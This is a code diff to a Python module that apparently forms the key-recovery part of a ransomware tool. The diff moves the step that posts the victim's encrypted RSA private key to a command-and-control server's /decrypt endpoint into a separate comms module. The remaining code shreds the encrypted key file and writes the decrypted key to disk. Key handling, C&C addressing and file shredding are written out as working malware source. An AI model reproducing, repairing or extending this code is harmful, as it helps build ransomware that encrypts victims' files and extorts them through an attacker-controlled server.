@@ -1,35 +1,26 @@
 import os
 import logging
 import requests
+import utils
 from base64 import b64decode, b64encode
-from .symmetric_encryption import AES
-from .asymmetric_encryption import RSA
-from .config import (
+from symmetric_encryption import AES
+from asymmetric_encryption import RSA
+from comms import get_decrypted_key_from_server
+from config import (
     ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
     UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
     ENCRYPTED_AES_KEY_FILE_LOCATION,
     UNENCRYPTED_AES_KEY_FILE_LOCATION,
     C_AND_C_SERVER_URL,
 )
-from . import utils
+
 
 logger = logging.getLogger(__name__)
 
 
 def decrypt_local_rsa_key():
     logger.info("Decrypting local RSA key")
-    encrypted_local_rsa_key_parts = utils.read_data_from_file(
-        ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, serialized=False
-    )
-    parameters = {
-        "payload": [
-            b64encode(part).decode("ascii") for part in encrypted_local_rsa_key_parts
-        ]
-    }
-    response = requests.post(url=f"{C_AND_C_SERVER_URL}/decrypt", json=parameters)
-    response = response.json()
-    unencrypted_local_private_key = b64decode(response.get("key"))
-
+    unencrypted_local_private_key = get_decrypted_key_from_server()
     utils.shred_file(ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION)
     utils.write_data_to_file(
         UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, unencrypted_local_private_key
@@ -59,7 +50,7 @@ def decrypt_file_encryption_details():
 
 
 def decode_file_encryption_details(detail):
-    detail = [b64decode(detail) for detail in detail.split("\t")]
+    detail = [b64decode(detail) for detail in detail.decode().split("\t")]
     return detail[0], detail[1], detail[-1]
 
 
